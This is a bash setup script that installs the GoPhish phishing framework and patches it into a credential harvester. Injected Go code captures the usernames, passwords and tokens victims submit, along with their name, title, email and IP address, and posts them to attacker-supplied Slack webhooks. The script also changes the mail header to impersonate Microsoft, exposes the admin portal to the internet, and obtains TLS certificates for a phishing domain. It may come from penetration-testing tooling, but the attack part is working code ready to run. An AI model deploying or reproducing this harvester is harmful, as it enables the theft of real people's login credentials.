#! /bin/bash

# Check for argument
if [[ $# -eq 0 || ( $# -eq 4 && ( "$3" = "SlackLoginDataWebhookUrl" || "$4" = "SlackDetailedDataWebhookUrl" ) ) ]]; then
	echo "Please specify http or https, the phishing domain or IP address, and optional Slack webhook URLs for login data and detailed data"
	echo "Example: gophish-slack.sh http 1.2.3.4"
	echo "Example: gophish-slack.sh http phishingdomain.com"
	echo "Example: gophish-slack.sh http 1.2.3.4 https://hooks.slack.com/services/abc/def/ghi https://hooks.slack.com/services/jkl/mno/pqr"
	echo "Example: gophish-slack.sh http phishingdomain.com https://hooks.slack.com/services/abc/def/ghi https://hooks.slack.com/services/jkl/mno/pqr"
	echo "Example: gophish-slack.sh https phishingdomain.com"
	echo "Example: gophish-slack.sh https phishingdomain.com https://hooks.slack.com/services/abc/def/ghi https://hooks.slack.com/services/jkl/mno/pqr"
	exit 1
fi

# Update
apt update

# Install gcc/g++ compilers and libraries
apt install -y build-essential

# Install Go
snap install --classic go

# Download GoPhish
go get github.com/gophish/gophish

# Change to the project source directory
cd ~/go/src/github.com/gophish/gophish/

# Remove email header
# sed -i "s/msg.SetHeader(\"X-Mailer\", config.ServerName)/\/\/msg.SetHeader(\"X-Mailer\", config.ServerName)/g" models/maillog.go

# Change email header
sed -i "s/const ServerName = \"gophish\"/const ServerName = \"Microsoft\"/g" config/config.go

# Allow the GoPhish Admin Portal to be accessible over the Internet
sed -i "s/127.0.0.1:3333/0.0.0.0:3333/g" config.json

# Slack Integration
if [ $# -eq 4 ]; then

	# Add Slack support
	url1="$(sed s@/@\\\\/@g <<<$3)"
	url2="$(sed s@/@\\\\/@g <<<$4)"
	sed -i '0,/)/{s/)/\t"bytes"\n\t"encoding\/json"\n)\n\ntype SlackRequestBody struct {\n\tText string `json:"text"`\n}\n/}' controllers/phish.go
	
	# Choose a way to display the data in Slack
	boldOrCodeBlock="codeblock"

	if [ $boldOrCodeBlock == "codeblock" ]; then
	
		# Code block format option
		sed -i 's/r = ctx.Set(r, "details", d)/r = ctx.Set(r, "details", d)\n\n\tmsg1 := "```Name: " + rs.BaseRecipient.FirstName + " " + rs.BaseRecipient.LastName\n\tmsg1 += "\\n"\n\tmsg1 += "Title: " + rs.BaseRecipient.Position\n\tmsg1 += "\\n"\n\tmsg1 += "Email: " + rs.BaseRecipient.Email\n\tmsg1 += "\\n"\n\tusername := ""\n\tpassword := ""\n\ttoken := ""\n\tfor k, v := range r.Form {\n\t\tif k == "username" {\n\t\t\tmsg1 += "Username: " + strings.Join(v, "")\n\t\t\tmsg1 += "\\n"\n\t\t\tusername = strings.Join(v, "")\n\t\t}\n\t}\n\tfor k, v := range r.Form {\n\t\tif k == "password" {\n\t\t\tmsg1 += "Password: " + strings.Join(v, "")\n\t\t\tmsg1 += "\\n"\n\t\t\tpassword = strings.Join(v, "")\n\t\t}\n\t}\n\tfor k, v := range r.Form {\n\t\tif k == "token" {\n\t\t\tmsg1 += "Token: " + strings.Join(v, "")\n\t\t\tmsg1 += "\\n"\n\t\t\ttoken = strings.Join(v, "")\n\t\t}\n\t}\n\tmsg2 := msg1\n\tfor k, v := range r.Form {\n\t\tif k != "username" \&\& k != "password" \&\& k != "token" {\n\t\t\tmsg2 += "Key: " + k + "   Value: " + strings.Join(v, "")\n\t\t\tmsg2 += "\\n"\n\t\t}\n\t}\n\tmsg2 += "User-Agent: " + r.Header.Get("User-Agent")\n\tmsg2 += "\\n"\n\tmsg2 += "IP Address: " + rs.IP\n\tmsg2 += "\\n"\n\tmsg2 += "Email Sent: " + rs.SendDate.Format("2006-01-02 15:04:05")\n\tmsg2 += "\\n"\n\tmsg2 += "Event: " + rs.ModifiedDate.Format("2006-01-02 15:04:05")\n\t\/\/msg2 += rs.Status\n\t\/\/msg2 += rid\n\t\/\/msg2 += strconv.FormatInt(rs.UserId, 10) \/\/ import "strconv"\n\twebhookUrlLogin := "'"$url1"'"\n\twebhookUrlData := "'"$url2"'"\n\tslackBody, _ := json.Marshal(SlackRequestBody{Text: msg1 + "```"})\n\treq, _ := http.NewRequest(http.MethodPost, webhookUrlLogin, bytes.NewBuffer(slackBody))\n\treq.Header.Add("Content-Type", "application\/json")\n\tclient := \&http.Client{Timeout: 10 * time.Second}\n\tif username != "" \|\| password != "" \|\| token != "" {\n\t\t_, _ = client.Do(req)\n\t}\n\tslackBody, _ = json.Marshal(SlackRequestBody{Text: msg2 + "```"})\n\treq, _ = http.NewRequest(http.MethodPost, webhookUrlData, bytes.NewBuffer(slackBody))\n\treq.Header.Add("Content-Type", "application\/json")\n\tclient = \&http.Client{Timeout: 10 * time.Second}\n\t_, _ = client.Do(req)\n/g' controllers/phish.go

	else
	
		# Bold format option
		sed -i 's/r = ctx.Set(r, "details", d)/r = ctx.Set(r, "details", d)\n\n\tmsg1 := "*Name:* " + rs.BaseRecipient.FirstName + " " + rs.BaseRecipient.LastName\n\tmsg1 += "\\n"\n\tmsg1 += "*Title*: " + rs.BaseRecipient.Position\n\tmsg1 += "\\n"\n\tmsg1 += "*Email*: " + rs.BaseRecipient.Email\n\tmsg1 += "\\n"\n\tusername := ""\n\tpassword := ""\n\ttoken := ""\n\tfor k, v := range r.Form {\n\t\tif k == "username" {\n\t\t\tmsg1 += "*Username:* " + strings.Join(v, "")\n\t\t\tmsg1 += "\\n"\n\t\t\tusername = strings.Join(v, "")\n\t\t}\n\t}\n\tfor k, v := range r.Form {\n\t\tif k == "password" {\n\t\t\tmsg1 += "*Password:* " + strings.Join(v, "")\n\t\t\tmsg1 += "\\n"\n\t\t\tpassword = strings.Join(v, "")\n\t\t}\n\t}\n\tfor k, v := range r.Form {\n\t\tif k == "token" {\n\t\t\tmsg1 += "*Token:* " + strings.Join(v, "")\n\t\t\tmsg1 += "\\n"\n\t\t\ttoken = strings.Join(v, "")\n\t\t}\n\t}\n\tmsg2 := msg1\n\tfor k, v := range r.Form {\n\t\tif k != "username" \&\& k != "password" \&\& k != "token" {\n\t\t\tmsg2 += "*Key:* " + k + "   *Value:* " + strings.Join(v, "")\n\t\t\tmsg2 += "\\n"\n\t\t}\n\t}\n\tmsg2 += "*User-Agent:* " + r.Header.Get("User-Agent")\n\tmsg2 += "\\n"\n\tmsg2 += "*IP Address:* " + rs.IP\n\tmsg2 += "\\n"\n\tmsg2 += "*Email Sent:* " + rs.SendDate.Format("2006-01-02 15:04:05")\n\tmsg2 += "\\n"\n\tmsg2 += "*Event:* " + rs.ModifiedDate.Format("2006-01-02 15:04:05")\n\t\/\/msg2 += rs.Status\n\t\/\/msg2 += rid\n\t\/\/msg2 += strconv.FormatInt(rs.UserId, 10) \/\/ import "strconv"\n\twebhookUrlLogin := "'"$url1"'"\n\twebhookUrlData := "'"$url2"'"\n\tslackBody, _ := json.Marshal(SlackRequestBody{Text: msg1})\n\treq, _ := http.NewRequest(http.MethodPost, webhookUrlLogin, bytes.NewBuffer(slackBody))\n\treq.Header.Add("Content-Type", "application\/json")\n\tclient := \&http.Client{Timeout: 10 * time.Second}\n\tif username != "" \|\| password != "" \|\| token != "" {\n\t\t_, _ = client.Do(req)\n\t}\n\tslackBody, _ = json.Marshal(SlackRequestBody{Text: msg2})\n\treq, _ = http.NewRequest(http.MethodPost, webhookUrlData, bytes.NewBuffer(slackBody))\n\treq.Header.Add("Content-Type", "application\/json")\n\tclient = \&http.Client{Timeout: 10 * time.Second}\n\t_, _ = client.Do(req)\n/g' controllers/phish.go
	fi
fi

if [ $1 == "https" ]; then

	# Update the listen port
	sed -i "s/0.0.0.0:80/0.0.0.0:443/g" config.json

	# Use TLS
	sed -i "s/\"use_tls\": false/\"use_tls\": true/g" config.json

	# Update the cert path and key path
	sed -i "s/example.crt/$2.crt/g" config.json
	sed -i "s/example.key/$2.key/g" config.json

	# Create SSL Certficates

	# Save domain to file for SLL generation script
	mkdir /opt/Central-InfoSec/SSL-Certificate-Generator-for-Phishing/
	echo $2 > /opt/Central-InfoSec/SSL-Certificate-Generator-for-Phishing/domains.txt

	# Tell user to press enter because of pause
	echo "Please press enter to continue"

	# Clone GitHub repository
	git clone https://github.com/centralinfosec/SSL-Certificate-Generator-for-Phishing /opt/Central-InfoSec/SSL-Certificate-Generator-for-Phishing

	# Allow script to be executed
	chmod +x /opt/Central-InfoSec/SSL-Certificate-Generator-for-Phishing/generateSslCertificate.sh

	# Generate SSL certificate
	/opt/Central-InfoSec/SSL-Certificate-Generator-for-Phishing/generateSslCertificate.sh

	# Stop Apache
	service apache2 stop

	# Remove the file with the domain name
	rm /opt/Central-InfoSec/SSL-Certificate-Generator-for-Phishing/domains.txt

	# Copy certificate to GoPhish directory
	cp /etc/letsencrypt/live/$2/fullchain.pem ~/go/src/github.com/gophish/gophish/$2.crt
	cp /etc/letsencrypt/live/$2/privkey.pem ~/go/src/github.com/gophish/gophish/$2.key
fi

# Build
go build

# Choose a way to start/stop GoPhish
tmuxOrService="service"

if [ $tmuxOrService == "service" ]; then

	# Create a service
	echo -e "[Unit]\nDescription=Service for GoPhish\n\n[Service]\nType=simple\nExecStart=/root/go/src/github.com/gophish/gophish/gophish\nWorkingDirectory=/root/go/src/github.com/gophish/gophish\nStandardOutput=file:/var/log/gophish-access.log\nStandardError=file:/var/log/gophish-error.log\n\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/gophish.service

	# Create symlink
	ln -s /lib/systemd/system/gophish.service /etc/systemd/system/gophish.service
	systemctl daemon-reload

	# Start the service
	service gophish start

	# Show the status
	service gophish status

	# Explain how to start and stop the service
	echo -e "\nStart GoPhish: service gophish start\nStop GoPhish: service gophish stop\n"

else
	# Show manual steps
	echo ""
	echo "Optional: Start tmux session to run GoPhish in the background:"
	echo "tmux new -s phishing"
	echo "cd ~/go/src/github.com/gophish/gophish/"
	echo "./gophish"
	echo "Ctrl+b d"
	echo ""
	echo "Optional: Reattach to tmux session:"
	echo "tmux ls"
	echo "tmux attach-session -t phishing"
	echo ""

	# Create script to start GoPhish
	echo "#! /bin/bash" > /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/start-gophish.sh
	echo "cd ~/go/src/github.com/gophish/gophish/" >> /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/start-gophish.sh
	echo "./gophish" >> /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/start-gophish.sh
	chmod +x /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/start-gophish.sh

	# Start GoPhish
	tmux new -d -s phishing /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/start-gophish.sh
fi

echo "Login at https://$2:3333 using \"admin:gophish\" and change the default password!"
